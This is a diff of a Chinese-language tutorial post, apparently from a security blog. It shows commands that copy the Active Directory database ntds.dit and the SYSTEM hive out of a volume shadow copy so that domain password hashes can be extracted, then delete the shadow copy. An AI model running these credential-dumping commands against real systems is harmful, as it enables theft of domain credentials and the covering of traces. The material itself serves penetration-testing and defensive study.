@@ -25,19 +25,19 @@ vssadmin create shadow /for=c:
 ## 从卷影中检索并复制ntds.dit文件到指定目录下
 使用以下命令（登录权限为域管理员权限）：
 {% highlight ruby %}
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\test\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\test\ntds.dit
 {% endhighlight %}
 ![2](/assets/vssadmin2.png)
 ## 从注册表或卷影中复制SYSTEM文件
 由于提取文件中的hash需要密钥，所以需要转储SYSTEM。这里从卷影副本中复制，使用以下命令：
 {% highlight ruby %}
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\SYSTEM C:\test\SYSTEM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\test\SYSTEM
 {% endhighlight %}
 ![3](/assets/vssadmin3.png)
 ## 删除创建的卷影副本
 使用以下命令：
 {% highlight ruby %}
-vssadmin delete shadows /shadow={d8a08578-1869-473b-bc19-fa96da667413}
+vssadmin delete shadows /shadow={cfa726cf-1bac-4a3a-b51c-105327f0dc13}
 {% endhighlight %}
 ![4](/assets/vssadmin4.png)
 注：这里使用的卷影ID值为第一步中创建卷影副本时的ID值
